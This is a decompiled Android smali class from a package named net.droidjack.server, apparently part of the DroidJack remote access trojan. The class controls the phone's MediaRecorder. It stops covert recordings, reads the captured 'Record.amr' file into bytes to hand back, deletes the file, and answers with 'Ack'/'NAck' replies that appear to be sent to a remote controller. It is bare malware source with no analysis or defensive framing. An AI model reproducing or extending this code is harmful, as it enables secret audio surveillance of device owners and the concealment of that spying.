.class public Lnet/droidjack/server/bn;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/media/MediaRecorder;

.field private b:[Landroid/os/ParcelFileDescriptor;

.field private c:Z

.field private d:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    iput-object p1, p0, Lnet/droidjack/server/bn;->d:Landroid/content/Context;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/bn;Landroid/media/MediaRecorder;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/bn;Z)V
    .locals 0

    iput-boolean p1, p0, Lnet/droidjack/server/bn;->c:Z

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/bn;[Landroid/os/ParcelFileDescriptor;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bn;->b:[Landroid/os/ParcelFileDescriptor;

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/bn;)Z
    .locals 1

    iget-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    return v0
.end method

.method static synthetic b(Lnet/droidjack/server/bn;)[Landroid/os/ParcelFileDescriptor;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/bn;->b:[Landroid/os/ParcelFileDescriptor;

    return-object v0
.end method

.method static synthetic c(Lnet/droidjack/server/bn;)Landroid/media/MediaRecorder;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static synthetic d(Lnet/droidjack/server/bn;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/bn;->d:Landroid/content/Context;

    return-object v0
.end method


# virtual methods
.method protected a()[B
    .locals 2
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/bo;

    invoke-direct {v1, p0}, Lnet/droidjack/server/bo;-><init>(Lnet/droidjack/server/bn;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    invoke-virtual {p0}, Lnet/droidjack/server/bn;->b()[B

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected b()[B
    .locals 2

    iget-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    :try_start_0
    iput-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    const/4 v0, 0x0

    iput-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    move-object v1, v0

    invoke-static {v1}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :cond_0
    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected c()[B
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/bq;

    invoke-direct {v1, p0}, Lnet/droidjack/server/bq;-><init>(Lnet/droidjack/server/bn;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    invoke-virtual {p0}, Lnet/droidjack/server/bn;->d()[B

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected d()[B
    .locals 2

    iget-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    :try_start_0
    iput-boolean v0, p0, Lnet/droidjack/server/bn;->c:Z

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    iget-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    const/4 v0, 0x0

    iput-object v0, p0, Lnet/droidjack/server/bn;->a:Landroid/media/MediaRecorder;

    iget-object v0, p0, Lnet/droidjack/server/bn;->d:Landroid/content/Context;

    const-string v1, "Record.amr"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-static {v0}, La/c;->a(Ljava/io/InputStream;)[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    move-object v1, v0

    invoke-static {v1}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :cond_0
    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method
